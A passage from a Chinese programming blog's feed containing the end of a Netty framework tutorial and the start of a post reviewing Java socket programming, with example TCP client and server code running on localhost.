class="line"><span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line"><span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line"><span class="comment">// 配置相关信息，Builder模式</span></span><br><span class="line"><span class="comment">// 配置Reactor模式所属线程组</span></span><br><span class="line">bootstrap.group(workerGroup)</span><br><span class="line">    <span class="comment">// 配置channel类</span></span><br><span class="line">    .channel(NioServerSocketChannel.class)</span><br><span class="line">    <span class="comment">// 配置Channel可选项。此处为“可连接队列大小”</span></span><br><span class="line">    .option(ChannelOption.SO_BACKLOG, <span class="number">1024</span>)</span><br><span class="line">    .childHandler(<span class="keyword">new</span> <span class="title class_">ChildChannelHandler</span>());</span><br></pre></td></tr></table></figure><p>再退化一下，那单actor单线程呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置服务端的NIO线程组，线程池容量为1</span></span><br><span class="line"><span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">ServerBootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerBootstrap</span>();</span><br><span class="line"><span class="comment">// 配置相关信息，Builder模式</span></span><br><span class="line"><span class="comment">// 配置Reactor模式所属线程组</span></span><br><span class="line">bootstrap.group(workerGroup)</span><br><span class="line">    <span class="comment">// 配置channel类</span></span><br><span class="line">    .channel(NioServerSocketChannel.class)</span><br><span class="line">    <span class="comment">// 配置Channel可选项。此处为“可连接队列大小”</span></span><br><span class="line">    .option(ChannelOption.SO_BACKLOG, <span class="number">1024</span>)</span><br><span class="line">    .childHandler(<span class="keyword">new</span> <span class="title class_">ChildChannelHandler</span>());</span><br></pre></td></tr></table></figure><p>是不是很简单了。</p><h3 id="客户端">客户端</h3><p>客户端构建大致流程如下：</p><figure><img src="/img/Netty框架学习/image-20230110000537717.png"alt="Netty客户端构建流程" /><figcaption aria-hidden="true">Netty客户端构建流程</figcaption></figure><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.bootstrap.Bootstrap;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.NioSocketChannel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.SocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/09</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TimerClient</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 连接事件拦截器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ConnectHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelOutboundHandlerAdapter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(ChannelHandlerContext ctx, SocketAddress remoteAddress, SocketAddress localAddress,</span></span><br><span class="line"><span class="params">                            ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;** from ConnectHandler : &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot; 连接成功 **&quot;</span>);</span><br><span class="line">            <span class="built_in">super</span>.connect(ctx, remoteAddress, localAddress, promise);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 写事件拦截器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">WriteHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelOutboundHandlerAdapter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(ChannelHandlerContext ctx, Object msg, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> (ByteBuf) msg;</span><br><span class="line">            System.out.println(<span class="string">&quot;** from WriteHandler : &quot;</span> + Thread.currentThread().getName()</span><br><span class="line">                    + <span class="string">&quot; 消息： ## &quot;</span> + buf.toString(StandardCharsets.UTF_8)</span><br><span class="line">                    + <span class="string">&quot; ## 发送成功 **&quot;</span>);</span><br><span class="line">            <span class="built_in">super</span>.write(ctx, msg, promise);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读事件拦截器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ResponseHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> &#123;</span><br><span class="line">            <span class="type">ByteBuf</span> <span class="variable">buf</span> <span class="operator">=</span> (ByteBuf) msg;</span><br><span class="line">            <span class="type">byte</span>[] response = <span class="keyword">new</span> <span class="title class_">byte</span>[buf.readableBytes()];</span><br><span class="line">            buf.readBytes(response);</span><br><span class="line">            System.out.println(<span class="string">&quot;** from TimeClientHandler : &quot;</span> + Thread.currentThread().getName()</span><br><span class="line">                    + <span class="string">&quot; 消息： ## &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(response, StandardCharsets.UTF_8)</span><br><span class="line">                    + <span class="string">&quot; ## 接收成功 **&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将我们的handlers注册到pipeline中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">HandlersRegister</span> <span class="keyword">extends</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel ch)</span> &#123;</span><br><span class="line">            ch.pipeline().addLast(<span class="keyword">new</span> <span class="title class_">ConnectHandler</span>(), <span class="keyword">new</span> <span class="title class_">WriteHandler</span>(), <span class="keyword">new</span> <span class="title class_">ResponseHandler</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> port, String host)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">group</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Bootstrap</span> <span class="variable">bootstrap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bootstrap</span>();</span><br><span class="line">            bootstrap.group(group)</span><br><span class="line">                    .channel(NioSocketChannel.class)</span><br><span class="line">                    .option(ChannelOption.TCP_NODELAY, <span class="literal">true</span>)</span><br><span class="line">                    .handler(<span class="keyword">new</span> <span class="title class_">HandlersRegister</span>());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 异步连接服务端</span></span><br><span class="line">            <span class="type">ChannelFuture</span> <span class="variable">f</span> <span class="operator">=</span> bootstrap.connect(host, port).sync();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 发送消息</span></span><br><span class="line">            <span class="keyword">if</span> (f.channel().isActive()) &#123;</span><br><span class="line">                <span class="type">byte</span>[] request = <span class="string">&quot;QUERY&quot;</span>.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                <span class="type">ByteBuf</span> <span class="variable">msg</span> <span class="operator">=</span> Unpooled.buffer(request.length);</span><br><span class="line">                msg.writeBytes(request);</span><br><span class="line">                f.channel().writeAndFlush(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭</span></span><br><span class="line">            f.channel().closeFuture().sync();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            group.shutdownGracefully();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">TimerClient</span>().connect(<span class="number">9999</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下图：</p><figure><img src="/img/Netty框架学习/image-20230119194555388.png"alt="运行结果" /><figcaption aria-hidden="true">运行结果</figcaption></figure><p>客户端和我分别发出了请求，终端中输出表明服务结果没问题。着重看右边的终端，可以看到<strong>连接、写、读事件</strong>都可以看到对应拦截的日志输出，这也说明我们定义的拦截器发挥作用了。</p><h1 id="参考文献">参考文献</h1><ul><li>《Scalable IO in Java》——Doug Lea（Java 之父）</li><li>《Netty权威指南 （第2版）》——李林锋</li><li>《Netty in Action（Netty 实战）》——Norman Maurer（何品 译）</li><li><ahref="https://zhuanlan.zhihu.com/p/536334873">Netty系列教程（二）Netty架构设计剖析- 知乎 (zhihu.com)</a></li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本篇学习一下Netty框架，Netty是一个Java实现的、非常流行的NIO网络编程框架，很多知名项目如a阿里的Dubbo、Spark、ElasticSearch、Hadoop、蚂蚁金服的SOFABolt、谷歌的gRPC等等。学习前建议先掌握Java中NIO相关API的使用，并理解Unix操作系统中I/O多路复用模型的理论。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/Netty框架学习/components.png&quot; alt=&quot;components&quot; style=&quot;zoom:100%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="网络编程" scheme="https://lzwgiter.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Java网络编程模型复习</title>
    <link href="https://lzwgiter.github.io/posts/d6b305b7.html"/>
    <id>https://lzwgiter.github.io/posts/d6b305b7.html</id>
    <published>2023-01-03T17:06:09.000Z</published>
    <updated>2023-01-18T02:19:36.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>失踪人口回归...，2022年几乎没怎么好好写博客，一方面原因是因为科研，另一方面...懒了懒了我错了。年底中招奥密克戎，最近也是才缓过劲来，真是坎坷的一年。本科之前其实接触过C语言的网络编程，带课的李金库老师讲的很好，记得当时特别地对I/O多路复用(select)留下了<ahref="https://github.com/lzwgiter/MyCWebStudy">很深的印象</a>。今天复习一下Java中网络编程的相关理论和代码，包括最基础的Sokcet使用以及三种I/O模型。（ps：<strong>我gitee的博客由于部分文章没法过审核，因此gitee博客以后可能就不会更新了，我仍然使用github博客为主。</strong></p><p><img src="/img/Java网络编程模型Review/db04ec35da1f9962545649576098426a.jpeg" alt="db04ec35da1f9962545649576098426a" style="zoom:67%;" /></p></blockquote><span id="more"></span><h1 id="什么是socketjava中如何使用">什么是Socket？Java中如何使用？</h1><p>老生常谈的问题了，什么是Socket？也即套接字？</p><p>首先我们要了解一下，什么是<strong>进程间通信（InterProcessCommunication,IPC）</strong>，操作系统中时时刻刻都有大量的进程在运行，每一个进程实体都由<strong>数据、程序代码和进程控制块(PCB)</strong>组成，每个进程都在自己的地址范围内运行，操作系统通过<strong>PCB</strong>控制进程，进程根据<strong>程序代码</strong>对<strong>数据</strong>进行处理计算。当两个进程之间需要通信的时候，操作系统为我们提供了很多途径，如UNIX中的pipe，下图是一个父子进程使用的普通管道，此外还有对等进程使用的命名管道。</p><figure><img src="/img/Java网络编程模型Review/IMG_20230103_131726.jpg"alt="Unix中的普通管道" /><figcaption aria-hidden="true">Unix中的普通管道</figcaption></figure><p>上述的计算和通信过程都是在<strong>一个机器内部</strong>发生的，因此我们很容易就会想到，那<strong>不同机器上的不同进程如何通信呢？</strong>ok，这就是网络编程干的事情。</p><p>操作系统为我们提供了Socket来完成这件事情。提供这个干什么呢？具体来说，既然是网络编程，那我们必定是要使用<strong>网络协议栈</strong>的，也即TCP/IP四层模型：应用层、传输层、网络层和网络接口层，Socket为作为应用层开发者的我们，提供了一种简单的使用网络协议栈的方法。如man手册中就一言以蔽之：</p><blockquote><p>The BSD compatible sockets are the uniform interface between the userprocess and the network protocol stacks in the kernel.</p><p>BSD(Berkeley Software Distribution, 伯克利软件套件)sockets是用户进程和内核中网络协议栈之间的通用接口。ps：这东西最早是伯克利大学开发的</p></blockquote><h2id="socket是为了解决网络编程中的什么问题">Socket是为了解决网络编程中的什么问题？</h2><p>我们深入探讨一下，Socket的出发点是为了解决什么问题。同样，我们先看看单机中进程通信的一个最基本的问题。</p><p>单机中，不同的进程运行在不同的地址空间内，当发生通信时，如何寻找另一个进程呢？</p><ul><li>通过PID，即processidentifier，通过这唯一的进程标识符，我们就可以唯一地确定一个进程。可以通过命令<code>ulimit -n</code>和查看<code>/proc/sys/kernel/pid_max</code>来知道pid的实际以及理论上限。</li></ul><p>那么自然而然的，<strong>问题1：</strong>网络编程中，本地的进程如何寻找另一个机器上的进程呢？也是使用PID吗？那万一这俩进程号一样，怎么确定唯一性呢？那用IP？关键这个机器上进程很多啊，你说个127.0.0.1我也不知道是哪个进程啊？</p><p>所以TCP/IP协议中才设计了<strong>传输层协议端口</strong>这个东西，我们使用一个端口号唯一确定一个进程，结合IP地址，我们就可以唯一的确定<strong>一台主机上的一个进程</strong>了，我们用一个五元组在全局中唯一表示一个<strong>网间进程通信：（传输层协议，本地IP，本地端口，远程IP，远程端口）</strong>。</p><p>如下图是TCP和UDP两种不同传输层协议的报文格式，这就是为什么报文中要有端口号。由于端口号是一个16bit的的字段，因此，共有<code>2^16=65535</code>个端口号可供我们使用，其中<code>0-1023</code>属于保留的端口(well-knowport)，<code>1-255</code>给一些常见服务如如HTTP 80、HTTPS 443、FTP21、DNS 53、SMTP25等等，<code>256-1023</code>保留给如路由等协议。而<code>1024-4999</code>可以作为任意客户的端口，<code>5000-65535</code>这个庞大的空间作为用户的服务器端口（毕竟连接服务器的人多嘛）。</p><figure><img src="/img/Java网络编程模型Review/报文格式.jpg"alt="TCP、UDP报文格式" /><figcaption aria-hidden="true">TCP、UDP报文格式</figcaption></figure><p>除了<strong>问题1</strong>，我们还面临着如下三个问题：</p><ol type="1"><li>如何连接网络剧哦协议栈</li><li>不同网络协议（如IPX/SPX）如何识别</li><li>不同应用的数据传输可靠性、速率等要求不同，如何实现有选择地使用网络协议栈提供的不同服务（即TCPor UDP）</li></ol><p>那上述问题，socket都帮我们解决了，socket作为操作系统本身的系统调用，为我们提供了使用网络协议栈的方法；socket创建时<code>int socket(int domain, int type, int protocol);</code>，为我们提供了不同网络协议的选择方法（如AF_IPX字段代表IPX协议、AF_DECnet代表DECet协议等等）；socket也可以让我们选择不同的传输层协议（SOCK_STREAM即TCP、SOCK_DGRAM即UDP）。</p><h2 id="java中的socket">Java中的Socket</h2><h3 id="tcp">TCP</h3><p>我们先看看在C语言中，也即UNIX系统中是如何创建并使用一个TCP类型的socket的。具体以C/S架构为例，如图所示：</p><figure><img src="/img/Java网络编程模型Review/IMG_20230103_130809.jpg"alt="TCP网络编程流程" /><figcaption aria-hidden="true">TCP网络编程流程</figcaption></figure><p>根据角色分一下类，我们可以看到，客户端程序和服务端程序需要执行的函数是有区别的：</p><ul><li>客户端不需要被动Listen</li><li>不需要绑定本地端口（即随机从1024-65535中选取一个），</li><li>不需要Accept远程机器的连接。</li></ul><p>因此，面向对象嘛，Java对这两种不同职责的Socket进行了划分，分别为<code>java.net.Socket</code>和<code>java.net.ServerSocket</code>，这俩的区别其实就是上面提到的三点。二者关系如下：</p><figure><img src="/img/Java网络编程模型Review/diffSocket.png"alt="Java中TCP网络编程常用类" /><figcaption aria-hidden="true">Java中TCP网络编程常用类</figcaption></figure><h4 id="服务端代码">服务端代码</h4><p>我们写一个简单的服务端，他将接收客户端的请求ID，并为其返回对应的数据。我们要使用到上面提到的<code>java.net.ServerSocket</code>，他的生命周期如下：</p><figure><img src="/img/Java网络编程模型Review/ServerSocket生命周期.png"alt="ServerSocket生命周期" /><figcaption aria-hidden="true">ServerSocket生命周期</figcaption></figure><p>下面我们将实现一个服务端程序，他接收客户端发来的个位数，并返回这个个位数的英文：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TCP 服务端 - 同步阻塞模式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BIOTCPServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ArrayList&lt;String&gt; DICT = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(</span><br><span class="line">            Arrays.asList(<span class="string">&quot;Zero&quot;</span>, <span class="string">&quot;One&quot;</span>, <span class="string">&quot;Two&quot;</span>, <span class="string">&quot;Three&quot;</span>, <span class="string">&quot;Four&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Five&quot;</span>, <span class="string">&quot;Six&quot;</span>, <span class="string">&quot;Seven&quot;</span>, <span class="string">&quot;Eight&quot;</span>, <span class="string">&quot;Nine&quot;</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 这里默认完成了bind的操作，你也可以通过无参构造，然后手动bind一个SocketAddress</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">6666</span>)) &#123;</span><br><span class="line">            <span class="comment">// 一直运行</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">char</span>[] data = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="comment">// 阻塞等待连接</span></span><br><span class="line">                <span class="type">Socket</span> <span class="variable">requestSocket</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">                <span class="comment">// 收到请求</span></span><br><span class="line">                System.out.println(<span class="string">&quot;# 客户端连接：&quot;</span> + requestSocket.getRemoteSocketAddress() + <span class="string">&quot; #&quot;</span>);</span><br><span class="line">                <span class="comment">// 接收数据并处理</span></span><br><span class="line">                <span class="type">Reader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(requestSocket.getInputStream());</span><br><span class="line">                reader.read(data);</span><br><span class="line">                <span class="comment">// 返回数据</span></span><br><span class="line">                <span class="type">Writer</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(requestSocket.getOutputStream());</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                out.write(DICT.get(Integer.parseInt(String.valueOf(data))));</span><br><span class="line">                out.flush();</span><br><span class="line">                <span class="comment">// 关闭连接</span></span><br><span class="line">                requestSocket.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            System.err.println(ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端代码">客户端代码</h4><p>对应我们的服务端，客户端代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TCP 客户端 - 同步阻塞模式</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/03</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BIOClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建连接（注意，这里会直接connect，你也可以通过无参构造，手动connect一个SocketAddress</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Socket</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6666</span>);) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;本地的Socket信息：&quot;</span> + client.getLocalSocketAddress());</span><br><span class="line">            System.out.println(<span class="string">&quot;远程的Socket信息：&quot;</span> + client.getRemoteSocketAddress());</span><br><span class="line">            <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(client.getOutputStream());</span><br><span class="line">            <span class="type">char</span>[] wordToInquire = <span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;2&#x27;</span>&#125;;</span><br><span class="line">            writer.write(wordToInquire);</span><br><span class="line">            writer.flush();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取数据</span></span><br><span class="line">            <span class="type">char</span>[] result = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">10</span>];</span><br><span class="line">            <span class="type">Reader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(client.getInputStream());</span><br><span class="line">            reader.read(result);</span><br><span class="line">            System.out.println(String.valueOf(wordToInquire) + <span class="string">&quot; in English is &quot;</span> + String.valueOf(result).trim());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;主机名无法解析&quot;</span> + ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            System.err.println(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="运行结果">运行结果</h4><p>最后我们的运行结果如下图所示：</p><figure><img src="/img/Java网络编程模型Review/image-20230103204535977.png"alt="BIO TCP运行结果" /><figcaption aria-hidden="true">BIO 